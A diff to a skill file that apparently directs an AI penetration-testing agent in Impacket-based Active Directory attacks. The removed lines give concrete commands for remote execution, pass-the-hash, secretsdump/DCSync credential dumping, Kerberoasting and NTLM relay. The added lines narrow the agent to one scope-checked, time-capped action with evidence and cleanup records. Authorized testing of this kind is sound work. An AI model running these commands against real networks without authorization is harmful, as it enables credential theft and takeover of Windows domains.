@@ -8,8 +8,9 @@ description: >
 arguments: "action target [-u user] [-p pass] [-hashes LM:NT] [-dc-ip ip]"
 model: inherit
 effort: medium
-context: inline
-agent:
+context: fork
+agent: vuln-hunter
+background: false
 category: ad-network
 domain: ad
 ---
@@ -19,19 +20,19 @@ domain: ad
 Shared contract: see AGENTS.md.
 
 ## Goal
-Turn valid creds or hashes into concrete AD/Windows actions — a shell, dumped secrets, or roastable
-tickets — via the Impacket example scripts, capturing every artifact for the report + credential store.
+Perform one least-destructive AD/Windows protocol action with supplied access and concrete proof.
+Credential dumping, roasting, relay and RCE are alternatives, never a compulsory chain.
 
 ## Steps
-1. Extract actual hosts from credential-qualified tool arguments into `HOSTS`, including DC/relay targets. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill impacket)"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --targets-file "$HOSTS" --run-dir "$RUN"`; nonzero STOP. Scope metadata never contains passwords/hashes.
-2. All commands use `python3 -I scripts/otus-log.py run --run-dir "$RUN" --targets-file "$HOSTS" -- <original argv>`. RCE argv: `psexec.py 'DOMAIN/user:password@TARGET'` or `wmiexec.py 'DOMAIN/user:password@TARGET'`; pass-the-hash adds original `-hashes LMHASH:NTHASH`. Do not invoke interactive forms: if no bounded one-shot form is available, stop and record the limitation.
-3. **Credential dumping:** `secretsdump.py 'DOMAIN/user:password@TARGET' -outputfile "$RUN/loot/secrets"`; DCSync from a DC: `secretsdump.py 'DOMAIN/user:password@DC' -just-dc -outputfile "$RUN/loot/ntds"`.
-4. **Roasting → hashcat** (hashcat format): `GetUserSPNs.py 'DOMAIN/user:password' -dc-ip <DC> -request -outputfile "$RUN/loot/kerberoast.txt"` and `GetNPUsers.py 'DOMAIN/' -usersfile users.txt -request -format hashcat -outputfile "$RUN/loot/asrep.txt"`.
-5. Relay argv `ntlmrelayx.py -tf targets.txt -smb2support -of "$RUN/loot/relay"` must cover only checked targets and satisfy non-interactive/bounded rules; never use `-i` or hold a listener. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --item 'scope-confirmed=ok:../../scope.json' --item 'action-executed=ok:run.log' --item 'results-recorded=ok:findings.md'`; add secret-free verified findings and actual artifacts/cleanup, or `no artifacts captured`.
+1. Choose ONE goal-relevant action and supplied identity/hash/ticket; extract actual endpoints from credential-qualified argv into plain HOSTS, including DC/induced targets. `RUN="$(python3 -I scripts/otus-log.py init --engagement "$ENGAGEMENT" --skill impacket --profile selected-action --coverage-set 'One selected protocol action with supplied identity')"`; `python3 -I scripts/otus-log.py scope-check --engagement "$ENGAGEMENT" --targets-file "$HOSTS" --run-dir "$RUN"`; nonzero STOP. Write notes/task.md with hypothesis, installed script/version, finite task and <=60-second command cap; no secrets in metadata.
+2. Inspect supported noninteractive argv/effects before contact; complete supplied auth avoids a password prompt. All actions use `python3 -I scripts/otus-log.py run --run-dir "$RUN" --targets-file "$HOSTS" --timeout 60 --grace 5 -- <verified one-shot argv>`. For a selected exec hypothesis, explicit `wmiexec.py "$IDENTITY" 'whoami'` is a one-shot alternative to a bare login; native remote bounds and actual cleanup effects must be established first. No bounded one-shot support -> partial/no launch.
+3. Enumeration/roasting/minimal credential read require their own objective-relevant hypothesis and checked rights. No mandatory full secretsdump/DCSync, all-user roast or protocol ladder; select the least data necessary with version-supported filters. Every contacted endpoint stays checked. No held relay/listener or interactive shell; a local cap does not prove a remote process stopped.
+4. Preserve actual per-run native loot/output and record artifact refs, proof, coverage, unmet prerequisites and created services/files in notes/results.md. Do not import unrelated caches. RCE/credentials require real evidence, not a command-success banner. Hard failure/refusal stops with unknown/owed cleanup as appropriate; no actionful retry.
+5. `python3 -I scripts/otus-log.py finish --run-dir "$RUN" --status "$STATUS" --summary "$SUMMARY" --stop-reason "$STOP" --omitted 'Other protocol actions and broad credential extraction' --item 'scope-confirmed=ok:../../scope.json' --item 'action-executed=ok:events.jsonl' --item 'results-recorded=ok:notes/results.md'`; finished declared query can be scoped-negative complete, missing goal proof/unfinished partial, nonzero error. Add only secret-free verified findings with actual state/artifacts/cleanup; return next-task proposal to coordinator.
 
 ## Modern tooling & alternatives
-Install via `pipx install impacket` (scripts as `psexec.py` or `impacket-psexec`). `netexec` wraps many
-actions at scale; `certipy`/`rubeus` cover AD CS / Kerberos. Prefer `wmiexec`/`smbexec` over `psexec` for stealth.
+Script aliases vary (`psexec.py` or `impacket-psexec`); verify installed versions during setup.
+Use the smallest relevant protocol action, not every credential-capable tool.
 
 ## Checklist
 ```yaml
@@ -43,22 +44,22 @@ checklist:
     on_fail: fail
     required: true
   - id: action-executed
-    desc: An impacket action ran and was logged (exec/dump/roast/relay)
-    verify: nonempty
-    evidence: run.log
-    on_fail: redo-skill
+    desc: Paired events/native output substantiate the selected action or disclosed no-launch
+    verify: judge
+    evidence: events.jsonl
+    on_fail: fail
     required: true
   - id: loot-captured
     desc: Artifacts (secrets/tickets/roast hashes) saved under loot/ via -outputfile
-    verify: exists
-    evidence: loot
-    on_fail: redo-part
+    verify: judge
+    evidence: notes/results.md
+    on_fail: fail
     required: false
   - id: results-recorded
-    desc: Run marker written (even when no artifacts captured)
-    verify: nonempty
-    evidence: findings.md
-    on_fail: redo-skill
+    desc: Actual proof, coverage, omissions and exact artifact/cleanup state match evidence
+    verify: judge
+    evidence: notes/results.md
+    on_fail: fail
     required: true
 ```
 
